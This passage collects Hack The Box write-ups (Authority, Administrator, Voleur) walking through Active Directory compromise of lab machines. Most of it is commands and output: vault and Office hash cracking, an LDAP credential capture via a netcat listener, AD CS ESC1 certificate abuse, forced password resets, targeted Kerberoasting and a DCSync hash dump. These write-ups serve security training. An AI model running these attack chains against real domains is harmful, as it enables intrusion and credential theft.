$ANSIBLE_VAULT;1.1;AES256 32666534386435366537653136663731633138616264323230383566333966346662313161326239 6134353663663462373265633832356663356239383039640a346431373431666433343434366139 35653634376333666234613466396534343030656165396464323564373334616262613439343033 6334326263326364380a653034313733326639323433626130343834663538326439636232306531 3438 $ANSIBLE_VAULT;1.1;AES256 31356338343963323063373435363261323563393235633365356134616261666433393263373736 3335616263326464633832376261306131303337653964350a363663623132353136346631396662 38656432323830393339336231373637303535613636646561653637386634613862316638353530 3930356637306461350a316466663037303037653761323565343338653934646533663365363035 6531 $ANSIBLE_VAULT;1.1;AES256 63303831303534303266356462373731393561313363313038376166336536666232626461653630 3437333035366235613437373733316635313530326639330a643034623530623439616136363563 34646237336164356438383034623462323531316333623135383134656263663266653938333334 3238343230333633350a646664396565633037333431626163306531336336326665316430613566 3764 Then run the ansible2john script separately on each file:
└─$ ansible2john encryptedVault-1 >> vaultHashes.txt └─$ ansible2john encryptedVault-2 >> vaultHashes.txt └─$ ansible2john encryptedVault-3 >> vaultHashes.txt Edit the vaultHashes.txt so that each vault’s hash start from the word $ansible$ as Hashcat asks for this specific format. To start cracking, Hashcat mode 16900 is used:
└─$ hashcat -m 16900 vaultHashes.txt /usr/share/wordlists/rockyou.txt All 3 of the hashes cracked using the same password and now to decrypt the vault content, we need to download “ansible-vault” first using apt:
└─$ sudo apt update && sudo apt install ansible-vault -y To decrypt the vault’s content:
└─$ ansible-vault decrypt encryptedVault-1 └─$ ansible-vault decrypt encryptedVault-2 └─$ ansible-vault decrypt encryptedVault-3 Looking at the same files where we saved the encrypted blob, we see that they contain their decrypted text now:
└─$ cat encryptedVault-1 svc_pwm └─$ cat encryptedVault-2 pWm_@dm!N_!23 └─$ cat encryptedVault-3 DevT3st@123 The first two values correspond to the PWM administrator username and password but the third one is of no use as it didn’t work for svc_ldap’s password.
Shell as svc_ldap # After login, we see a screen showing configurations for the PWM application. We are also given the option to download its main configuration file “PwmConfiguration.xml” from the “Download Configuration” button.
The file has the encrypted credentials of svc_ldap user but we can’t decrypt it. Looking around in the other panel (Configuration Editor), we find a setting where the LDAP URL of the server is configured. The same page has the svc_ldap in the LDAP Proxy User section but again the password is hidden and not shown.
PWM validates LDAP connectivity by attempting to bind to the configured LDAP server using the configured proxy account. By replacing the LDAP server address with an attacker-controlled host, we can observe the application’s LDAP bind request and capture the credentials transmitted during the authentication attempt.
We can start netcat listener and add our tun0 interface IP and set it as the LDAP URL for the application to try checking if the application sends us the cleartext credentials of svc_ldap. Using the Add Value button in the LDAP URLs section:
Start the netcat listener on the port 389:
nc -lvnp 389 Now click the “Test LDAP Profile” button on the top of the page and see in the netcat listener back. We have successfully received the cleartext credentials of svc_ldap
Using the provided credentials, we can login to the host using evil_winrm:
└─$ evil-winrm -i 10.129.11.43 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' The user.txt can be found in the desktop folder of svc_ldap user.
Escalating Privileges # ADCS Vulnerability Enumeration (ESC1) # There is no other Domain User in the target machine and svc_ldap also doesn’t have any special access over AD objects. Remembering that the Ansible directory contained ADCS-related data, we can move forward to confirm if there is any ADCS present in the domain using Netexec:
└─$ nxc ldap 10.129.11.43 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M adcs LDAP 10.129.11.43 389 AUTHORITY [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never) LDAP 10.129.11.43 389 AUTHORITY [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! ADCS 10.129.11.43 389 AUTHORITY [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)' ADCS 10.129.11.43 389 AUTHORITY Found PKI Enrollment Server: authority.authority.htb ADCS 10.129.11.43 389 AUTHORITY Found CN: AUTHORITY-CA We identified a CA as “AUTHORITY-CA” and to enumerate if it has any misconfigured or vulnerable templates, we will use certipy:
└─$ certipy find -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.11.43 -vulnerable -stdout -target authority.authority.htb Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 37 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 13 enabled certificate templates [*] Finding issuance policies [*] Found 21 issuance policies [*] Found 0 OIDs linked to templates [*] Retrieving CA configuration for 'AUTHORITY-CA' via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] Successfully retrieved CA configuration for 'AUTHORITY-CA' [*] Checking web enrollment for CA 'AUTHORITY-CA' @ 'authority.authority.htb' [!] Error checking web enrollment: [Errno 111] Connection refused [!] Use -debug to print a stacktrace [*] Enumeration output: Certificate Authorities 0 CA Name : AUTHORITY-CA DNS Name : authority.authority.htb Certificate Subject : CN=AUTHORITY-CA, DC=authority, DC=htb Certificate Serial Number : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4 Certificate Validity Start : 2023-04-24 01:46:26+00:00 Certificate Validity End : 2123-04-24 01:56:25+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Active Policy : CertificateAuthority_MicrosoftDefault.Policy Permissions Owner : AUTHORITY.HTB\Administrators Access Rights ManageCa : AUTHORITY.HTB\Administrators AUTHORITY.HTB\Domain Admins AUTHORITY.HTB\Enterprise Admins ManageCertificates : AUTHORITY.HTB\Administrators AUTHORITY.HTB\Domain Admins AUTHORITY.HTB\Enterprise Admins Enroll : AUTHORITY.HTB\Authenticated Users Certificate Templates 0 Template Name : CorpVPN Display Name : Corp VPN Certificate Authorities : AUTHORITY-CA Enabled : True Client Authentication : True Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Enrollment Flag : IncludeSymmetricAlgorithms PublishToDs AutoEnrollmentCheckUserDsCertificate Private Key Flag : ExportableKey Extended Key Usage : Encrypting File System Secure Email Client Authentication Document Signing IP security IKE intermediate IP security use KDC Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Schema Version : 2 Validity Period : 20 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Template Created : 2023-03-24T23:48:09+00:00 Template Last Modified : 2023-03-24T23:48:11+00:00 Permissions Enrollment Permissions Enrollment Rights : AUTHORITY.HTB\Domain Computers AUTHORITY.HTB\Domain Admins AUTHORITY.HTB\Enterprise Admins Object Control Permissions Owner : AUTHORITY.HTB\Administrator Full Control Principals : AUTHORITY.HTB\Domain Admins AUTHORITY.HTB\Enterprise Admins Write Owner Principals : AUTHORITY.HTB\Domain Admins AUTHORITY.HTB\Enterprise Admins Write Dacl Principals : AUTHORITY.HTB\Domain Admins AUTHORITY.HTB\Enterprise Admins Write Property Enroll : AUTHORITY.HTB\Domain Admins AUTHORITY.HTB\Enterprise Admins [+] User Enrollable Principals : AUTHORITY.HTB\Domain Computers [!] Vulnerabilities ESC1 : Enrollee supplies subject and template allows client authentication. The tool finds that the CorpVPN template is vulnerable to ESC1. ESC1 allows an attacker to request a certificate containing an arbitrary SAN. If the attacker can enroll for the vulnerable template, they can obtain a certificate impersonating another user, including Domain Administrators.
The exploitation of this template has following requirements:
Low privilege users can enroll Manager approval disabled No authorized signatures required Client Authentication enabled Enrollee supplies subject enabled Almost all the requirements are ok except the 1st one which requires a user that can ask for the template’s certificate. Looking in the certipy output shows that Domain Computers have the rights to enroll and by default in Active Directory, all domain users are allowed to create and join 10 machine accounts to the domain. This property is determined by the value of MachineAccountQuota of each domain user and we can check if svc_ldap can create machine accounts or not with Netexec:
└─$ nxc ldap 10.129.11.43 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq LDAP 10.129.11.43 389 AUTHORITY [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never) LDAP 10.129.11.43 389 AUTHORITY [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! MAQ 10.129.11.43 389 AUTHORITY [*] Getting the MachineAccountQuota MAQ 10.129.11.43 389 AUTHORITY MachineAccountQuota: 10 Machine Account Creation # The output confirms that the default MachineAccountQuota is 10, allowing authenticated users to create up to ten machine accounts. We can add a machine account to the domain with impacket-addcomputer:
└─$ impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name 'Attacker-PC$' -computer-pass 'Password@12345' -dc-ip 10.129.11.43 [*] Successfully added machine account Attacker-PC$ with password Password@12345. Certificate Request & Impersonation # Using req option of certipy to ask a certificate using the machine account credentials and in the SAN field, we will add the name of a high-privileged user like Administrator that we want to impersonate:
└─$ certipy req -u 'Attacker-PC$@authority.htb' -p 'Password@12345' -target 10.129.11.43 -ca AUTHORITY-CA -template CorpVPN -upn Administrator Certipy v5.0.3 - by Oliver Lyak (ly4k) [!] DNS resolution failed: The DNS query name does not exist: AUTHORITY.HTB. [!] Use -debug to print a stacktrace [*] Requesting certificate via RPC [*] Request ID is 2 [*] Successfully requested certificate [*] Got certificate with UPN 'Administrator' [*] Certificate has no object SID [*] Try using -sid to set the object SID or see the wiki for more details [*] Saving certificate and private key to 'administrator.pfx' [*] Wrote certificate and private key to 'administrator.pfx' Using the certificate to request a TGT as Administrator
└─$ certipy auth -pfx administrator.pfx -username Administrator -domain authority.htb -dc-ip 10.129.11.43 Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: 'Administrator' [*] Using principal: 'administrator@authority.htb' [*] Trying to get TGT... [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type) [-] Use -debug to print a stacktrace [-] See the wiki for more information LDAP Shell Access & Group Modification # The error “KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)” occurs when the Domain Controller does not support PKINIT. Alternatively, we can use schannel authentication to get a ldap shell:
└─$ certipy auth -pfx administrator.pfx -username Administrator -domain authority.htb -dc-ip 10.129.11.43 -ldap-shell Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: 'Administrator' [*] Connecting to 'ldaps://10.129.11.43:636' [*] Authenticated to '10.129.11.43' as: 'u:HTB\\Administrator' Type help for list of commands # In the help menu, we have different opions for privilege escalation. We can simply add our user svc_ldap to the Administrators group with:
# add_user_to_group svc_ldap Administrators Adding user: svc_ldap to group Administrators result: OK As the user is member of Administrators group now, we can again authenticate as svc_ldap using evil-wirnm but this time we will be able to navigate the Administrator’s directory which was not allowed before.
└─$ evil-winrm -i 10.129.11.43 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' The flag is available in the root.txt on Administrator’s Desktop.
summary: Compromise an Active Directory domain by chaining an exposed SMB share, cracked Ansible Vault secrets, a PWM LDAP credential leak, and an AD CS ESC1 misconfiguration.
title: Authority Machine Writeup | HTB

content:
Summary # Administrator is a medium-difficulty Windows machine that showcases a full Active Directory domain compromise starting from a set of low-privileged credentials. By enumerating Active Directory ACLs with BloodHound, we discover that olivia has GenericAll permissions over michael, allowing us to reset his password. Michael, in turn, possesses ForceChangePassword rights over benjamin, whose credentials provide access to an FTP service containing a Password Safe backup. After cracking the database, we recover additional domain credentials and identify a valid account for emily. Further privilege enumeration reveals that Emily has GenericWrite permissions over ethan, enabling a targeted Kerberoasting attack. Cracking Ethan’s service ticket exposes credentials for an account with DCSync privileges, ultimately allowing us to dump the Administrator NTLM hash and achieve full domain compromise.
Reconnaissance # Rustscan # We start with Rustscan to quickly identify all the open ports from the total of 65535 possible ports.
└─$ rustscan -a 10.129.10.59 -r 0-65535 PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 127 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 50533/tcp open unknown syn-ack ttl 127 50544/tcp open unknown syn-ack ttl 127 50549/tcp open unknown syn-ack ttl 127 50560/tcp open unknown syn-ack ttl 127 50594/tcp open unknown syn-ack ttl 127 58994/tcp open unknown syn-ack ttl 127 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap 10.129.10.59 -T4 -sC -sV -p 21,53,88,135,138,139,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,50533,50544,50549,50560,50594,58994 Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-02 18:48 +0500 Nmap scan report for 10.129.10.59 Host is up (0.11s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-07-02 12:48:12Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 50533/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 50544/tcp open msrpc Microsoft Windows RPC 50549/tcp open msrpc Microsoft Windows RPC 50560/tcp open msrpc Microsoft Windows RPC 50594/tcp open msrpc Microsoft Windows RPC 58994/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2026-07-02T12:49:05 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: -1h00m00s To sync the system time with the DC:
└─$ sudo ntpdate 10.129.232.130 Initial Access # Enumeration # We start by enumerating the SMB shares and also to identify the hostname of the Domain Controller which needs to be added to the /etc/hosts file for the proper communication of tools with the DC.
└─$ nxc smb 10.129.10.59 -u olivia -p 'ichliebedich' --shares SMB 10.129.10.59 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True) SMB 10.129.10.59 445 DC [+] administrator.htb\olivia:ichliebedich SMB 10.129.10.59 445 DC [*] Enumerated shares SMB 10.129.10.59 445 DC Share Permissions Remark SMB 10.129.10.59 445 DC ----- ----------- ------ SMB 10.129.10.59 445 DC ADMIN$ Remote Admin SMB 10.129.10.59 445 DC C$ Default share SMB 10.129.10.59 445 DC IPC$ READ Remote IPC SMB 10.129.10.59 445 DC NETLOGON READ Logon server share SMB 10.129.10.59 445 DC SYSVOL READ Logon server share From the output it is clear that the initial credentials provided by the machine description are valid and that the hostname of the Domain Controller is DC. We can add the following entries to our /etc/hosts file:
└─$ cat /etc/hosts 10.129.10.59 administrator.htb DC.administrator.htb DC Looking back at the shares listing, there is no non-default share. Even then, using spider_plus module of Netexec to see what they contain. After analyzing the output, we didn’t find anything unusual.
The FTP service on port 21 is accessible. We attempted to authenticate using the provided domain credentials, but the login failed.
└─$ ftp 10.129.10.59 Connected to 10.129.10.59. 220 Microsoft FTP Service Name (10.129.10.59:flamo): olivia 331 Password required Password: 530 User cannot log in, home directory inaccessible. ftp: Login failed ftp> exit 221 Goodbye. Next step is to collect Active Directory data using BloodHound to take an overview of privileges granted to users and if our current user also has any domain privileges.
└─$ bloodhound-ce-python -c all -u 'olivia' -p 'ichliebedich' -d 'administrator.htb' -ns 10.129.10.59 --dns-tcp --zip --dns-timeout 90 After analyzing the privileges, we can see that Olivia has GenericAll on Michael and then Michael has ForceChangePassword privileges on Benjamin.
Lateral Movement # As Olivia has GenericAll, it allows us to change the password of Michael without knowing the old password. We can use Bloodyad for changing Michael’s password:
└─$ bloodyad -u olivia -p 'ichliebedich' -d administrator.htb -i 10.129.10.59 set password 'Michael' 'Michael@123' [+] Password changed successfully! Now to change Benjamin’s password using the credentials of Michael:
└─$ bloodyad -u michael -p 'Michael@123' -d administrator.htb -i 10.129.10.59 set password 'Benjamin' 'Benjamin@123' [+] Password changed successfully! There are no special privileges granted to Benjamin after looking in the BloodHound GUI and the writable output of Bloodyad. As FTP access was denied before, we can try to check the credentials of Michael and Benjamin to see if they are allowed access to the service:
└─$ ftp 10.129.10.59 Connected to 10.129.10.59. 220 Microsoft FTP Service Name (10.129.10.59:flamo): benjamin 331 Password required Password: 230 User logged in. Remote system type is Windows_NT. ftp> ls 229 Entering Extended Passive Mode (|||63370|) 125 Data connection already open; Transfer starting. 10-05-24 09:13AM 952 Backup.psafe3 Credential Discovery # Michael was also denied access. However, Benjamin’s credentials successfully authenticated, allowing us to download the Backup.psafe3 file.
└─$ file Backup.psafe3 Backup.psafe3: Password Safe V3 database It’s a password saving database which we can try to open with the “passwordsafe” Linux utility. It needs to be installed first:
└─$ sudo apt update && sudo apt install passwordsafe -y The database is encrypted and requires a master password before its contents can be accessed so we need to perform hash cracking. We first need to extract the hash from the Password Safe database before attempting to crack it offline.
└─$ pwsafe2john Backup.psafe3 > psafeHash.txt Cracking the hash with JohnTheRipper revealed the password:
After opening the password database and providing the password we just cracked, we found 3 domain users with their credentials but only Emily’s credentials worked
Emily is a group member of Remote Management Users group allowing her to access the host using WinRM. We can log in using evil-winm and get the user.txt flag in her desktop folder:
└─$ evil-winrm -i 10.129.10.59 -u emily -p '<password>' Escalating Privileges # Kerberoasting Ethan # Looking in the BloodHound GUI back, we found that Emily has GenericWrite over Ethan which can again be abused for password recovery through Kerberoasting attack.
We need to add a SPN on Ethan’s account which can be done using python script targetedKerberoast.py. It will automatically add the SPN, query the TGT, extracts its hash and clear the added SPN with just one command
└─$ python3 targetedKerberoast.py -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -d administrator.htb --dc-ip 10.129.10.59 -v We save the extracted TGS hash to a file before attempting an offline password cracking attack with Hashcat.
└─$ hashcat -m 13100 ethanTGSHash.txt /usr/share/wordlists/rockyou.txt The TGS hash is successfully cracked, revealing Ethan’s plaintext password.
DCSync # The outbount privileges of Ethan showed that he has DCSync on the domain which can be abused to extract the NTLM hash of Administrator to comrpmise the whole domain
To extract the NTLM hash of Administrator, we can use impacket-secretsdump:
└─$ impacket-secretsdump administrator.htb/ethan:limpbizkit@10.129.10.59 -dc-ip 10.129.10.59 -just-dc-user Administrator Finally, we authenticate using Evil-WinRM with the extracted NTLM hash and retrieve the root.txt flag.
└─$ evil-winrm -i 10.129.10.59 -u Administrator -H '<NT-Hash>'
summary: Full Active Directory compromise through ACL abuse, Password Safe credential recovery, targeted Kerberoasting, and DCSync.
title: Administrator Machine Writeup | HTB

content:
Summary # Voleur is a medium-difficulty Windows machine that simulates an assumed-breach scenario by providing low-privileged domain credentials from the outset. The engagement takes place in an Active Directory environment where NTLM authentication is disabled, requiring Kerberos-based authentication throughout. After enumerating network services and SMB shares, a password-protected Excel spreadsheet is discovered and its password is recovered through offline cracking. The spreadsheet reveals domain credentials, leading to further Active Directory enumeration and a targeted Kerberoasting attack that compromises a service account with remote management access. Using delegated group privileges, a previously deleted domain user is restored, enabling access to DPAPI-protected credentials that reveal a higher-privileged account. Further enumeration uncovers an SSH private key for a backup service account, providing access to a Linux subsystem hosted on the Domain Controller. Finally, backup copies of the Active Directory database and registry hives are extracted to recover the Administrator’s NTLM hash, resulting in full domain compromise.
Reconnaissance # Rustscan # We start with Rustscan to quickly identify all the open ports from the total of 65535 possible ports.
└─$ rustscan -a 10.129.232.130 -r 0-65535 PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 2222/tcp open EtherNetIP-1 syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49355/tcp open unknown syn-ack ttl 127 49356/tcp open unknown syn-ack ttl 127 49368/tcp open unknown syn-ack ttl 127 49381/tcp open unknown syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 58137/tcp open unknown syn-ack ttl 127 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap 10.129.232.130 -T4 -sC -sV -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49355,49356,49368,49381,49664,49668,58137 Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-01 14:59 +0500 Nmap scan report for 10.129.232.130 Host is up (0.094s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-07-01 17:59:38Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 2222/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA) | 256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA) |_ 256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519) 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49355/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49356/tcp open msrpc Microsoft Windows RPC 49368/tcp open msrpc Microsoft Windows RPC 49381/tcp open msrpc Microsoft Windows RPC 49664/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 58137/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required | smb2-time: | date: 2026-07-01T18:00:28 |_ start_date: N/A |_clock-skew: 7h59m58s To sync the system time with the DC:
└─$ sudo ntpdate 10.129.232.130 Initial Access # Enumerating SMB Shares # As the description of machine provided the initial credentials (ryan.naylor : HollowOct31Nyt), we can use these to enumerate the SMB shares:
└─$ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares SMB 10.129.232.130 445 DC [*] x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False) SMB 10.129.232.130 445 DC [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED The hostname of the target is identified as DC so we need to add the following hostname entries to our /etc/hosts file for the proper working of our tools that interact with Domain Controller:
└─$ cat /etc/hosts 10.129.232.130 voleur.htb DC.voleur.htb DC From the output, it is observed that NTLM authentication is disabled. This means that, to proceed further, we need to use Kerberos authentication. Netexec provides the -k flag to authenticate using Kerberos:
└─$ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares -k SMB 10.129.232.130 445 DC [*] x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False) SMB 10.129.232.130 445 DC [+] voleur.htb\ryan.naylor:HollowOct31Nyt SMB 10.129.232.130 445 DC [*] Enumerated shares SMB 10.129.232.130 445 DC Share Permissions Remark SMB 10.129.232.130 445 DC ----- ----------- ------ SMB 10.129.232.130 445 DC ADMIN$ Remote Admin SMB 10.129.232.130 445 DC C$ Default share SMB 10.129.232.130 445 DC Finance SMB 10.129.232.130 445 DC HR SMB 10.129.232.130 445 DC IPC$ READ Remote IPC SMB 10.129.232.130 445 DC IT READ SMB 10.129.232.130 445 DC NETLOGON READ Logon server share SMB 10.129.232.130 445 DC SYSVOL READ Logon server share There are 3 non-default SMB shares and ryan.naylor has access to only IT. To view what each accessible share contains, Netexec spider_plus module can be used which spiders the accessible shares and generates an output file listing their contents
└─$ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -M spider_plus From the output file, it is shown that the IT share contains an Excel sheet namely “Access_Review.xlsx”. To download the file:
└─$ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --share IT --get-file 'First-Line Support/Access_Review.xlsx' Access_Review.xlsx SMB 10.129.232.130 445 DC [*] x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False) SMB 10.129.232.130 445 DC [+] voleur.htb\ryan.naylor:HollowOct31Nyt SMB 10.129.232.130 445 DC [*] Copying "First-Line Support/Access_Review.xlsx" to "Access_Review.xlsx" SMB 10.129.232.130 445 DC [+] File "First-Line Support/Access_Review.xlsx" was downloaded to "Access_Review.xlsx" The file is encrypted and asking for a password when opened. Extracting the hash and cracking it is the next step. The script “office2john” extracts the file’s hash:
└─$ office2john Access_Review.xlsx > ExcelSheetHash.txt JohnTheRipper (JTR) can be used for cracking the hash as the file already contains the format supported by the tool:
└─$ john -w=/usr/share/wordlists/rockyou.txt ExcelSheetHash.txt Using default input encoding: UTF-8 Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES]) Cost 1 (MS Office version) is 2013 for all loaded hashes Cost 2 (iteration count) is 100000 for all loaded hashes Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status <REDACTED> (Access_Review.xlsx) Session completed. The password for the Excel spreadsheet is successfully cracked. After opening the spreadsheet and entering the password, we see the Excel sheet contains users, passwords, and the main privileges that are assigned to them.
The credentials of 2 service accounts are provided and a user whose password is reset to “NightT1meP1dg3on14” and then the account is deleted. Checking the credentials of the service accounts with Netexec revealed that their passwords are still valid:
└─$ nxc smb 10.129.232.130 -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k SMB 10.129.232.130 445 DC [*] x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False) SMB 10.129.232.130 445 DC [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn └─$ nxc smb 10.129.232.130 -u 'svc_iis' -p 'N5pXyW1VqM7CZ8' -k SMB 10.129.232.130 445 DC [*] x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False) SMB 10.129.232.130 445 DC [+] voleur.htb\svc_iis:N5pXyW1VqM7CZ8 Enumerating Active Directory # After obtaining the credentials of 3 accounts, we can move on to collecting the Active Directory data with BloodHound for easy visualization via GUI and planning our next attack path. Before collecting the data, we need to get a TGT for our user as BloodHound collector supports Kerberos ticket if used with the variable KRB5CCNAME:
└─$ impacket-getTGT voleur.htb/ryan.naylor:HollowOct31Nyt -dc-ip 10.129.232.130 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in ryan.naylor.ccache Set the ticket to the environment variable:
└─$ export KRB5CCNAME=ryan.naylor.ccache Now we can successfully utilize BloodHound collector via Kerberos authentication:
└─$ bloodhound-ce-python -c all -u 'ryan.naylor' -d 'voleur.htb' -ns 10.129.232.130 -dc DC.voleur.htb --dns-tcp --zip --dns-timeout 90 -k -no-pass <SNIP> INFO: Done in 00M 26S INFO: Compressing output into 20260701232524_bloodhound.zip Start the BloodHound GUI and upload the zip file. Checking the outbound privileges of the users we have access to, we identified that svc_ldap has privileges over 3 objects
With these privileges, we can add SPNs on the 2 users shown in the screenshot above and try Kerberoasting attack to crack their password:
